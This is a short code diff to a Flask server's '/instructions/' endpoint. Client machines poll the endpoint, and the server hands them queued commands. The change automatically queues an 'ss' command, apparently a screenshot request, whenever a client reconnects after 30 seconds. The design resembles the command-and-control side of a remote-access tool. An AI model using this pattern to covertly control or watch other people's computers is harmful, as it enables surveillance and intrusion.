@@ -152,11 +152,15 @@ def sweet_child():
 @app.route("/instructions/", methods=["GET"])
 def instructions():
     client = request.args.get("u")
+    last_call = clients[client] if client in clients else 0
     clients[client] = time.time()
     write_json("clients.json", clients)
     if not client in client_instructions:
         client_instructions[client] = []
-        instruction_outputs[client] = []
+        instruction_outputs[client] = {}
+    # if last call was more than timeout, add logon instruction
+    if time.time() - last_call > 30:
+        client_instructions[client].append(([random_string(10), "ss"], time.time()))
     client_instructions[client] = [instruction for instruction in client_instructions[client] if time.time() - instruction[1] < 60]
     return INSTRUCTION_SEP_TOKEN.join(INSTRUCTION_VAL_SEP_TOKEN.join(instruction[0]) for instruction in client_instructions[client])
 
